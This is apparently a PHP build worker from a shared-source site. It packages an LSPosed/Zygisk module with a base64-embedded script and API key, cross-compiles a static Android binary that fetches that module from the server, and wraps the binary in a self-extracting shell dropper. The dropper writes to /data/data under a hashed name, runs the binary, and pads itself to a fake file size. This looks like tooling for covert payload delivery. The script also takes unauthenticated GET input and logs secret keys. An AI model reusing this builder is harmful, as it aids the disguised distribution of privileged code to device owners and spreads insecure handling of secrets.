<?php
// build_worker.php - 编译后台进程官网:泽峰.top    更多公益开源资源分享 \n TG@ASDK886 QQ1063167389\n各大源码免费分享 网络搜集 打破信息差    官方频道:https://t.me/+FDfQgP9RFdljYjFl

if (!isset($argv) && isset($_GET['build_id'])) {
    $argv = [
        'build_worker.php',
        $_GET['build_id'],
        $_GET['user_id'],
        $_GET['api_key'],
        $_GET['fake_mb'],
        $_GET['host']
    ];
    $argc = 6;
}

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/build_error.log');

$log = __DIR__ . '/build_debug.log';
@file_put_contents($log, date('[Y-m-d H:i:s]') . " Worker started\n", FILE_APPEND);

if ($argc < 6) {
    @file_put_contents($log, "ERROR: 参数不足\n", FILE_APPEND);
    echo json_encode(['success' => false, 'message' => '参数不足'], JSON_UNESCAPED_UNICODE);
    exit;
}

$build_id = $argv[1];
$user_id = $argv[2];
$api_key = $argv[3];
$fake_mb = intval($argv[4]);
$host = $argv[5];

$base = __DIR__;
$builds_dir = $base . '/builds/';

if (!is_dir($builds_dir)) {
    @mkdir($builds_dir, 0755, true);
}

$status_file = sys_get_temp_dir() . '/build_status_' . $build_id . '.json';

function setStatus($s) {
    global $status_file, $log;
    $data = array_merge(['status' => 'building', 'ts' => time()], $s);
    @file_put_contents($status_file, json_encode($data, JSON_UNESCAPED_UNICODE));
    @file_put_contents($log, date('[H:i:s]') . " Status: " . json_encode($data) . "\n", FILE_APPEND);
}

try {
    $module_url = '';
    $binary_url = '';
    $module_zip = '';
    $out_file = '';
    
    // ===== 打包模块 =====
    $module_template = $base . '/build_src/moban/lsposed_zygisk/';
    $var_script = $base . '/build_src/moban/bianliang.sh';
    
    if (is_dir($module_template)) {
        setStatus(['step' => '打包模块', 'progress' => 20]);
        @file_put_contents($log, "开始打包模块\n", FILE_APPEND);
        
        $tmp = sys_get_temp_dir() . '/m_' . $build_id . '/';
        @mkdir($tmp, 0755, true);
        
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($module_template, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($it as $f) {
            $d = $tmp . $it->getSubPathName();
            if ($f->isDir()) {
                @mkdir($d, 0755, true);
            } else {
                @copy($f, $d);
            }
        }
        
        if (file_exists($var_script)) {
            $v = @file_get_contents($var_script);
            if ($v !== false) {
                @file_put_contents($log, "替换密钥: " . $api_key . "\n", FILE_APPEND);
                // 使用用户名的MD5作为API_KEY
                $v = str_replace('API_KEY="把你的api_key填这里"', 'API_KEY="' . $api_key . '"', $v);
                $e = base64_encode($v);
                $sf = $tmp . 'service.sh';
                if (file_exists($sf)) {
                    $sc = @file_get_contents($sf);
                    if ($sc !== false) {
                        $sc = str_replace('ENCODED_SCRIPT="base64填入所需"', 'ENCODED_SCRIPT="' . $e . '"', $sc);
                        @file_put_contents($sf, $sc);
                    }
                }
            }
        }
        
        if (!class_exists('ZipArchive')) {
            throw new Exception('ZipArchive扩展未安装');
        }
        
        $module_zip = $builds_dir . 'module_' . $build_id . '.zip';
        $z = new ZipArchive();
        $openResult = $z->open($module_zip, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        if ($openResult !== true) {
            throw new Exception('无法创建ZIP文件，错误码: ' . $openResult);
        }
        
        $it2 = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($tmp, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        $fileCount = 0;
        foreach ($it2 as $f) {
            if ($f->isDir()) continue;
            $filePath = $f->getRealPath();
            $relativePath = substr($filePath, strlen($tmp));
            if ($z->addFile($filePath, $relativePath)) {
                $fileCount++;
            }
        }
        $z->close();
        
        $it3 = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($tmp, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it3 as $f) {
            if ($f->isDir()) {
                @rmdir($f->getRealPath());
            } else {
                @unlink($f->getRealPath());
            }
        }
        @rmdir($tmp);
        
        if ($fileCount > 0) {
            $module_url = 'http://' . $host . '/builds/module_' . $build_id . '.zip';
            @file_put_contents($log, "模块打包完成，文件数: $fileCount\n", FILE_APPEND);
        }
    } else {
        @file_put_contents($log, "模块模板不存在，跳过\n", FILE_APPEND);
    }
    
    // ===== 编译C++ =====
    $cpp_main = $base . '/build_src/jni/src/main.cpp';
    $cpp_cjson = $base . '/build_src/jni/src/res/cJSON.c';
    
    if (file_exists($cpp_main)) {
        setStatus(['step' => '编译C++', 'progress' => 50]);
        @file_put_contents($log, "开始编译C++\n", FILE_APPEND);
        
        $compiler = null;
        $possible_compilers = [
            '/usr/bin/aarch64-linux-gnu-g++',
            '/usr/bin/aarch64-linux-android-g++',
            '/usr/local/bin/aarch64-linux-gnu-g++'
        ];
        foreach ($possible_compilers as $comp) {
            if (file_exists($comp) && is_executable($comp)) {
                $compiler = $comp;
                break;
            }
        }
        
        if ($compiler && $module_url) {
            $tmp_main = sys_get_temp_dir() . '/main_' . $build_id . '.cpp';
            @copy($cpp_main, $tmp_main);
            
            $cpp = @file_get_contents($tmp_main);
            if ($cpp !== false) {
                // 替换模块URL为当前服务器地址
                $cpp = str_replace(
                    'const char* MODULE_URL = "http://fw-adb.mhfs.eu.org.cc//lsposed_zygisk.zip";',
                    'const char* MODULE_URL = "' . $module_url . '";',
                    $cpp
                );
                @file_put_contents($tmp_main, $cpp);
            }
            
            $bin = sys_get_temp_dir() . '/bin_' . $build_id;
            $cmd = "$compiler -static -s -std=c++11 -O2 -pthread " . escapeshellarg($tmp_main) . " ";
            if (file_exists($cpp_cjson)) {
                $cmd .= escapeshellarg($cpp_cjson) . " ";
            }
            $cmd .= "-o " . escapeshellarg($bin) . " 2>&1";
            
            @file_put_contents($log, "执行编译命令: $cmd\n", FILE_APPEND);
            exec($cmd, $out, $ret);
            @unlink($tmp_main);
            
            @file_put_contents($log, "编译结果: ret=$ret\n", FILE_APPEND);
            
            if ($ret === 0 && file_exists($bin)) {
                setStatus(['step' => 'gzip压缩', 'progress' => 70]);
                @file_put_contents($log, "C++编译成功\n", FILE_APPEND);
                
                $gz = sys_get_temp_dir() . '/gz_' . $build_id;
                exec("gzip -c " . escapeshellarg($bin) . " > " . escapeshellarg($gz) . " 2>&1");
                
                if (file_exists($gz)) {
                    setStatus(['step' => '生成文件', 'progress' => 85]);
                    
                    $gz_size = filesize($gz);
                    $out_file = $builds_dir . 'binary_' . $build_id . '.sh';
                    $target_size = $fake_mb * 1024 * 1024;
                    $bname = '/data/data/' . substr(md5($build_id), 0, 10) . '.ns';
                    
                    $fp = @fopen($out_file, 'w');
                    if ($fp) {
                        fwrite($fp, "#!/system/bin/sh\n");
                        fwrite($fp, 'TARGET="' . $bname . '"' . "\n");
                        fwrite($fp, 'GZIP_SIZE=' . $gz_size . "\n");
                        fwrite($fp, "mkdir -p /data/data 2>/dev/null || exit 1\n");
                        fwrite($fp, 'cat "$0" | sed "1,/^__ARCHIVE_BELOW__$/d" | head -c $GZIP_SIZE | gzip -d > "$TARGET" || {' . "\n");
                        fwrite($fp, '    rm -f "$TARGET" 2>/dev/null; exit 1' . "\n}\n");
                        fwrite($fp, 'chmod +x "$TARGET"' . "\n");
                        fwrite($fp, 'exec "$TARGET" "$@"' . "\n");
                        fwrite($fp, "__ARCHIVE_BELOW__\n");
                        
                        $gf = @fopen($gz, 'r');
                        if ($gf) {
                            while (!feof($gf)) {
                                $data = fread($gf, 8192);
                                if ($data === false) break;
                                fwrite($fp, $data);
                            }
                            fclose($gf);
                        }
                        
                        if ($target_size > 0) {
                            fseek($fp, $target_size - 1);
                            fwrite($fp, "\0");
                        }
                        fclose($fp);
                        
                        if (file_exists($out_file)) {
                            $binary_size = round(filesize($out_file) / 1024 / 1024, 2);
                            $binary_url = 'http://' . $host . '/console.php?dl=1&t=' . $build_id . '_bin';
                            @file_put_contents($log, "二进制编译完成，大小: {$binary_size}MB\n", FILE_APPEND);
                        }
                    }
                    
                    @unlink($bin);
                    @unlink($gz);
                }
            } else {
                $error_msg = is_array($out) ? implode("\n", $out) : 'Unknown error';
                @file_put_contents($log, "C++编译失败: $error_msg\n", FILE_APPEND);
            }
        } else {
            @file_put_contents($log, "无编译器或无模块URL，跳过C++编译\n", FILE_APPEND);
        }
    } else {
        @file_put_contents($log, "C++源文件不存在，跳过\n", FILE_APPEND);
    }
    
    // ===== 更新数据库 =====
    try {
        if (file_exists($base . '/db.php')) {
            require_once $base . '/db.php';
            if (isset($pdo) && ($module_url || $binary_url)) {
                $stmt = $pdo->prepare("UPDATE users SET build_count = 1, module_url = ?, binary_url = ? WHERE id = ?");
                $stmt->execute([$module_url, $binary_url, $user_id]);
                @file_put_contents($log, "数据库更新完成\n", FILE_APPEND);
            }
        }
    } catch (Exception $e) {
        @file_put_contents($log, "数据库错误: " . $e->getMessage() . "\n", FILE_APPEND);
    }
    
    // ===== 完成 =====
    $module_size = ($module_url && file_exists($module_zip)) ? round(filesize($module_zip) / 1024 / 1024, 2) : 0;
    $binary_size = ($binary_url && file_exists($out_file)) ? round(filesize($out_file) / 1024 / 1024, 2) : 0;
    $final_size = $binary_size > 0 ? $binary_size : $module_size;
    
    $result = [
        'status' => 'done',
        'module_url' => $module_url,
        'binary_url' => $binary_url,
        'build_id' => $build_id,
        'file_size' => $final_size
    ];
    
    setStatus($result);
    @file_put_contents($log, "✅ 编译完成\n\n", FILE_APPEND);
    
    if (isset($_GET['build_id'])) {
        echo json_encode([
            'success' => true,
            'status' => 'done',
            'module_url' => $module_url,
            'binary_url' => $binary_url,
            'build_id' => $build_id,
            'file_size' => $final_size,
            'message' => '编译完成'
        ], JSON_UNESCAPED_UNICODE);
    }
    
} catch (Exception $e) {
    $error = ['status' => 'error', 'message' => $e->getMessage()];
    setStatus($error);
    @file_put_contents($log, "❌ 错误: " . $e->getMessage() . "\n", FILE_APPEND);
    
    if (isset($_GET['build_id'])) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()], JSON_UNESCAPED_UNICODE);
    }
}